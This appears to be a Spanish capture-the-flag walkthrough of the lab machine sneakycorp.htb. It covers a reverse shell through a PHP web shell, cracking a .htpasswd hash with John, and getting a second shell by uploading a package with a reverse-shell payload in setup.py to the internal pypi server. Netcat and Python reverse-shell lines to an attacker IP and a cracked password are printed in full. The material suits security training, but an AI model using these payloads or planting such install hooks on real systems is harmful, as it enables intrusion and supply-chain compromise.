## Explotacion de vulnerabilidad & Ganando acceso {-}

### Crear una reverse shell con s4vishell.php {-}

1. Escuchamos por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Ejecutamos una reverse shell 

    ```bash
    dev.sneakycorp.htb/s4vishell.php?cmd=nc -e /bin/bash 10.10.14.20 443
    ```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Descubrimiento de la maquina {-}

```bash
ls -l
cd /home
cd low
ls -la
cd .ssh
ls
cat authorized_keys
ps -fawwx
```

Vemos la flag pero no podemos leerla. Huele a que nos tenemos que convertir al usuario **low**. Tambien vemos un recurso **Pypi** con
un fichero de credenciales tipo `.htpasswd`

```cat
cat /var/www/pypi.sneakycorp.htb/.htpasswd
```

Vemos la contraseña del usuarion **pypi**. La copiamos en la maquina de atacante y tratamos de romperla con **John**

Por ultimo se puede ver un nuevo subdominio llamado `pypi.sneakycorp.htb`, lo introduzimos en el `/etc/hosts`

### Crackeo con John {-}

Copiamos el contenido del fichero .htpasswd en un fichero llamado hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Hemos podido crackear la contraseña del usuario pypi


### Descubrimiento de la configuration NGINX {-}

Intentando conectarnos a la web por el subdominio `pypi.sneakycorp.htb`, vemos que hay una redirection automatica al domino normal.
Sabiendo que estamos en frente de un **NGINX**, analizamos como el reverse proxy esta configurado.

```bash
cd /etc/nginx
ls
cd sites-enabled
cat sneakycorp.htb
cat pypi.sneakycorp.htb
```

Hay ya vemos que para ir al subdominio `pypi.sneakycorp.htb` tenemos que pasar por el puerto **8080**, y efectivamente si browseamos
la web con `pypi.sneakycorp.htb:8080` ya podemos ver la web del **pypi server**

### Crear un packete malicioso para pypi {-}

Como el servicio pypi es un server que tiene conectividad con el exterior, podemos seguir lo siguientes pasos en la maquina de atacante.

```bash
mkdir pypi
cd !$
mkdir pwned
cd !$
touch __init__.py
touch setup.py
```

El fichero `__init__.py` se queda vacio y el contenido del `setup.py` seria el siguiente.

```python
import setuptools
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.20",443))
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

setuptools.setup(
    name="example-pkg-YOUR-USERNAME-HERE",
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.6",
)
```

La idea aqui es que cuando el pypi server ejecute el setup.py, queremos que nos entable una reverse shell. El codigo
de la reverse shell es de **monkey pentester** y la hemos retocado para que vaya en el fichero `setup.py`.

Configuramos el equipo para poder enviar el paquete al repositorio victima.

```bash
rm ~/.pypirc
vi ~/.pypirc
```

El contenido del fichero `.pypirc` seria

```bash
[distutils]
index-servers = remote

[remote]
repository = http://pypi.sneakycorp.htb:8080
username = pypi
password = soufianeelhaoui
```

Ahora podemos enviarlo

1. Nos ponemos en escucha en el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Enviamos el paquete al pypi server

    ```bash
    python3 setup.py sdist upload -r remote
    ```

1. Tenemos una shell pero primero nos a ejecutado desde nuestro propio equipo

    - no ponemos una vez mas en escucha al puerto 443

        ```bash
        nc -nlvp 443
        ```

    - en el primero shell le damos a exit

Y ya esta

```bash
whoami
#Output
Law
```

Ya le podemos hacer un nuevo tratamiento de la TTY.

